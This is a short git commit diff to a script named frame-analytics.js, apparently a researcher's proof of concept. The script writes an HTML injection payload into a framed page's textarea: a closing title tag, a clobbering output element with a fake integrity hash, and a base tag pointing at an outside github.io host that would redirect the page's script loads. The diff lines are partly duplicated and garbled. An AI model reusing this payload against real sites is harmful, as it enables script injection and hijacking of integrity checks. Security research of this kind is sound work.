063545fe8ed9b1c20d0e3ec6b5fb22ef54ffb1a7
Sudistark <31372554+Sudistark@users.noreply.github.com>
2020-11-10 08:36:19 +0530

    Update frame-analytics.js

--- new/files/analytics/js/frame-analytics.js
+++ new/files/analytics/js/frame-analytics.js
@@ -1,6 +1,5 @@
 window.onload = function() {
-x = document.getElementById('frame').contentWindow.document	x = document.getElementById('frame').contentWindow.document
-x.getElementsByTagName('textarea')[0].innerHTML = "</title><output id=fileIntegrity>HYScnNEeZgi9v3d5AI4QkVG6pvWViDobB+fqjhTHi5o=</output><base href=//sudistark.github.io/new1/>"	x.getElementsByTagName('textarea')[0].innerHTML = "</title><output id=fileIntegrity>HYScnNEeZgi9v3d5AI4QkVG6pvWViDobB+fqjhTHi5o=</output><base href=//sudistark.github.io/new1/>"
-x.getElementById("btn").click();	x.getElementById("btn").click();
-console.log("done click")	console.log("done click")
+x = document.getElementById('frame').contentWindow.document	;
+x.getElementsByTagName('textarea')[0].innerHTML = "</title><output id=fileIntegrity>HYScnNEeZgi9v3d5AI4QkVG6pvWViDobB+fqjhTHi5o=</output><base href=//sudistark.github.io/new1/>";
+console.log("done click");
 }
